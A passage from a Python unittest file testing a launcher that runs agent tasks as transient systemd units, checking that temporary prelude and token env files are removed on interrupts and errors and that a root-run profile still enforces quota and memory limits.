                        "launcher.task_units.check_resources", return_value=True
                    ), patch("subprocess.Popen") as _mp, patch(
                        "subprocess.run"
                    ) as _mr:
                        _mp.side_effect = AssertionError("must not reach Popen")
                        _mr.side_effect = AssertionError("must not reach run")
                        if tid.endswith("exec"):
                            with self.assertRaises(TaskUnitAdmissionError):
                                _tu._raw_execute_transient_task_unit(
                                    task_id=tid,
                                    command_argv=["echo", "hi"],
                                    memory_mb=256,
                                    workspace=str(self.ws),
                                    tmpdir=str(tmpdir),
                                    quse_json=_quse_ok(),
                                )
                        else:
                            with self.assertRaises(TaskUnitAdmissionError):
                                _tu.spawn_transient_task_unit(
                                    task_id=tid,
                                    command_argv=["echo", "hi"],
                                    memory_mb=256,
                                    workspace=str(self.ws),
                                    tmpdir=str(tmpdir),
                                    quse_json=_quse_ok(),
                                )
                self.assertFalse((tmpdir / f"prelude_{tid}.py").exists())
                self.assertFalse(
                    (tmpdir / f"agent-task-{tid}.service.env").exists()
                )

    def test_s1_execute_build_keyboardinterrupt_removes_both_isolated(self):
        # S1/M09-adjacent: an execute-only build raising KeyboardInterrupt
        # must remove that task's own prelude and env (distinct task id, no
        # spawn call to mask an execute leak).
        from launcher import task_units as _tu

        tid = "s1-exec-bki"
        tmpdir = self.ws / ".local" / "tmp" / tid
        tmpdir.mkdir(parents=True, exist_ok=True)
        with patch(
            "launcher.task_units.build_systemd_run_argv",
            side_effect=KeyboardInterrupt("stop"),
        ):
            with patch(
                "launcher.task_units.check_resources", return_value=True
            ), patch("subprocess.Popen") as _mp:
                _mp.side_effect = AssertionError("must not reach Popen")
                with self.assertRaises(KeyboardInterrupt):
                    _tu._raw_execute_transient_task_unit(
                        task_id=tid,
                        command_argv=["echo", "hi"],
                        memory_mb=256,
                        workspace=str(self.ws),
                        tmpdir=str(tmpdir),
                        quse_json=_quse_ok(),
                    )
        self.assertFalse((tmpdir / f"prelude_{tid}.py").exists())
        self.assertFalse((tmpdir / f"agent-task-{tid}.service.env").exists())

    def test_s1_spawn_build_keyboardinterrupt_removes_both(self):
        # S1/M10 killer: narrowing the spawn build-failure handler from
        # BaseException to Exception would let this KeyboardInterrupt skip
        # cleanup, leaving both files behind.
        from launcher import task_units as _tu

        tid = "s1-spawn-bki"
        tmpdir = self.ws / ".local" / "tmp" / tid
        tmpdir.mkdir(parents=True, exist_ok=True)
        with patch(
            "launcher.task_units.build_systemd_run_argv",
            side_effect=KeyboardInterrupt("stop"),
        ):
            with patch(
                "launcher.task_units.check_resources", return_value=True
            ), patch("subprocess.run") as _mr:
                _mr.side_effect = AssertionError("must not reach run")
                with self.assertRaises(KeyboardInterrupt):
                    _tu.spawn_transient_task_unit(
                        task_id=tid,
                        command_argv=["echo", "hi"],
                        memory_mb=256,
                        workspace=str(self.ws),
                        tmpdir=str(tmpdir),
                        quse_json=_quse_ok(),
                    )
        self.assertFalse((tmpdir / f"prelude_{tid}.py").exists())
        self.assertFalse((tmpdir / f"agent-task-{tid}.service.env").exists())

    def test_s1_spawn_run_failures_remove_token_env(self):
        # S1/M11 killer: narrowing the spawn run-failure handler from
        # BaseException to Exception would let KI/OSError skip the token-env
        # removal. rc!=0 must also remove the env and raise. Each case uses
        # a distinct task id. (The non-secret prelude on this path is
        # S4-informational and intentionally not asserted here.)
        from launcher import task_units as _tu
        from launcher.task_units import TaskUnitExecutionError

        cases = ("ki", "oserror", "rc1")
        for case in cases:
            with self.subTest(case=case):
                tid = f"s1-spawn-run-{case}"
                tmpdir = self.ws / ".local" / "tmp" / tid
                tmpdir.mkdir(parents=True, exist_ok=True)
                with patch(
                    "launcher.task_units.check_resources", return_value=True
                ), patch("subprocess.run") as _mr:
                    if case == "ki":
                        _mr.side_effect = KeyboardInterrupt("stop")
                        with self.assertRaises(KeyboardInterrupt):
                            _tu.spawn_transient_task_unit(
                                task_id=tid,
                                command_argv=["echo", "hi"],
                                memory_mb=256,
                                workspace=str(self.ws),
                                tmpdir=str(tmpdir),
                                quse_json=_quse_ok(),
                                extra_env={"SAFE": "value-1234"},
                            )
                    elif case == "oserror":
                        _mr.side_effect = OSError("no systemd")
                        with self.assertRaises(OSError):
                            _tu.spawn_transient_task_unit(
                                task_id=tid,
                                command_argv=["echo", "hi"],
                                memory_mb=256,
                                workspace=str(self.ws),
                                tmpdir=str(tmpdir),
                                quse_json=_quse_ok(),
                                extra_env={"SAFE": "value-1234"},
                            )
                    else:
                        _mr.return_value.returncode = 1
                        _mr.return_value.stdout = ""
                        _mr.return_value.stderr = "boom"
                        with self.assertRaises(TaskUnitExecutionError):
                            _tu.spawn_transient_task_unit(
                                task_id=tid,
                                command_argv=["echo", "hi"],
                                memory_mb=256,
                                workspace=str(self.ws),
                                tmpdir=str(tmpdir),
                                quse_json=_quse_ok(),
                                extra_env={"SAFE": "value-1234"},
                            )
                self.assertFalse(
                    (tmpdir / f"agent-task-{tid}.service.env").exists(),
                    msg=f"token env leaked for case {case}",
                )

    def test_s1_execute_popen_keyboardinterrupt_reraises_unwrapped(self):
        # S1/M17 killer: narrowing the execute Popen handler from
        # BaseException to Exception would skip the owned-unit stop AND the
        # unwrapped re-raise. The same KI object must propagate (not a
        # TaskUnitExecutionError), the owned unit must be signalled, and
        # both files removed by the finally block.
        from launcher import task_units as _tu
        from launcher.task_units import TaskUnitExecutionError

        tid = "s1-exec-popen-ki"
        tmpdir = self.ws / ".local" / "tmp" / tid
        tmpdir.mkdir(parents=True, exist_ok=True)
        sentinel = KeyboardInterrupt("s1-gap-ki")
        with patch(
            "launcher.task_units.check_resources", return_value=True
        ), patch("subprocess.Popen", side_effect=sentinel), patch(
            "launcher.task_units.signal_owned_unit", return_value=True
        ) as _sig, patch(
            "launcher.task_units.verify_task_unit_cleanup",
            return_value=(True, {}),
        ):
            with self.assertRaises(KeyboardInterrupt) as cm:
                _tu._raw_execute_transient_task_unit(
                    task_id=tid,
                    command_argv=["echo", "hi"],
                    memory_mb=256,
                    workspace=str(self.ws),
                    tmpdir=str(tmpdir),
                    quse_json=_quse_ok(),
                    extra_env={"SAFE": "value-1234"},
                )
        self.assertIs(cm.exception, sentinel)
        self.assertNotIsInstance(cm.exception, TaskUnitExecutionError)
        _sig.assert_called_once()
        self.assertFalse((tmpdir / f"prelude_{tid}.py").exists())
        self.assertFalse((tmpdir / f"agent-task-{tid}.service.env").exists())

    def test_s1_execute_popen_oserror_wrapped(self):
        # S1: a plain-Exception Popen failure (OSError) must be wrapped as
        # TaskUnitExecutionError with the original as cause, after owned-unit
        # cleanup and file removal.
        from launcher import task_units as _tu
        from launcher.task_units import TaskUnitExecutionError

        tid = "s1-exec-popen-ose"
        tmpdir = self.ws / ".local" / "tmp" / tid
        tmpdir.mkdir(parents=True, exist_ok=True)
        with patch(
            "launcher.task_units.check_resources", return_value=True
        ), patch("subprocess.Popen", side_effect=OSError("no systemd")), patch(
            "launcher.task_units.signal_owned_unit", return_value=True
        ) as _sig, patch(
            "launcher.task_units.verify_task_unit_cleanup",
            return_value=(True, {}),
        ):
            with self.assertRaises(TaskUnitExecutionError) as cm:
                _tu._raw_execute_transient_task_unit(
                    task_id=tid,
                    command_argv=["echo", "hi"],
                    memory_mb=256,
                    workspace=str(self.ws),
                    tmpdir=str(tmpdir),
                    quse_json=_quse_ok(),
                    extra_env={"SAFE": "value-1234"},
                )
        self.assertIsInstance(cm.exception.__cause__, OSError)
        _sig.assert_called_once()
        self.assertFalse((tmpdir / f"prelude_{tid}.py").exists())
        self.assertFalse((tmpdir / f"agent-task-{tid}.service.env").exists())

    def test_s2_gap_keyboardinterrupt_after_build_cleans_both(self):
        # S2: a KeyboardInterrupt between a successful build and Popen/run
        # startup (here: at datetime.now for started_at) must leave neither
        # the token env nor the prelude behind, in both execute and spawn.
        # started_at/clean_env live inside the build-failure wrapper, so the
        # wrapper's BaseException handler removes both files.
        import types as _types

        import datetime as _real_dt

        from launcher import task_units as _tu

        for tid, is_exec in (
            ("s2-gap-exec", True),
            ("s2-gap-spawn", False),
        ):
            with self.subTest(task_id=tid):
                tmpdir = self.ws / ".local" / "tmp" / tid
                tmpdir.mkdir(parents=True, exist_ok=True)
                armed = {"built": False}
                real_build = _tu.build_systemd_run_argv

                def _build_then_arm(**kw):
                    try:
                        return real_build(**kw)
                    finally:
                        armed["built"] = True

                class _GapDateTime(_real_dt.datetime):
                    @classmethod
                    def now(cls, tz=None):
                        if armed["built"]:
                            raise KeyboardInterrupt("s2-gap")
                        return _real_dt.datetime.now(tz)

                fake_ns = _types.SimpleNamespace(
                    datetime=_GapDateTime, timezone=_real_dt.timezone
                )
                with patch(
                    "launcher.task_units.build_systemd_run_argv",
                    side_effect=_build_then_arm,
                ), patch(
                    "launcher.task_units.datetime", fake_ns
                ), patch(
                    "launcher.task_units.check_resources", return_value=True
                ), patch(
                    "subprocess.Popen"
                ) as _mp, patch(
                    "subprocess.run"
                ) as _mr:
                    _mp.side_effect = AssertionError("must not reach Popen")
                    _mr.side_effect = AssertionError("must not reach run")
                    kwargs = {
                        "task_id": tid,
                        "command_argv": ["echo", "hi"],
                        "memory_mb": 256,
                        "workspace": str(self.ws),
                        "tmpdir": str(tmpdir),
                        "quse_json": _quse_ok(),
                        "extra_env": {"SAFE": "value-1234"},
                    }
                    with self.assertRaises(KeyboardInterrupt):
                        if is_exec:
                            _tu._raw_execute_transient_task_unit(**kwargs)
                        else:
                            _tu.spawn_transient_task_unit(**kwargs)
                self.assertFalse((tmpdir / f"prelude_{tid}.py").exists())
                self.assertFalse(
                    (tmpdir / f"agent-task-{tid}.service.env").exists()
                )


class TestQuotaGatesAreNotBypassedByRootProfile(RootRunProfileTestCase):
    """The trusted namespace must never relax admission (fail-closed quota)."""

    def test_missing_quota_evidence_denies_root_run_unit(self):
        from launcher.task_units import _raw_execute_transient_task_unit

        with patch("launcher.task_units.check_resources", return_value=True):
            with self.assertRaises(TaskUnitAdmissionError) as cm:
                _raw_execute_transient_task_unit(
                    task_id="root-run-quota",
                    command_argv=["/bin/sh", str(self.script)],
                    memory_mb=1500,
                    workspace=str(self.ws),
                    tmpdir=str(self.ws),
                    quse_json=None,
                    profile="root-run",
                    trusted_root_evidence=self.evidence(),
                    extra_env=self.private_env(),
                )
        self.assertIn("fresh quse_json evidence is required", str(cm.exception))

    def test_memory_ceiling_still_enforced_for_root_run(self):
        from launcher.task_units import _raw_execute_transient_task_unit

        with self.assertRaises(TaskUnitAdmissionError) as cm:
            _raw_execute_transient_task_unit(
                task_id="root-run-mem",
                command_argv=["/bin/sh", str(self.script)],
                memory_mb=4096,
                workspace=str(self.ws),
                tmpdir=str(self.ws),
                quse_json={"zai": {"status": "ok", "windows": {"7d": {"percent_remaining": 90.0,
                                                                        "reset_at": _future(600)}}}},
                profile="root-run",
                trusted_root_evidence=self.evidence(),
            )
        self.assertIn("exceeds maximum allowed ceiling", str(cm.exception))


if __name__ == "__main__":
    unittest.main()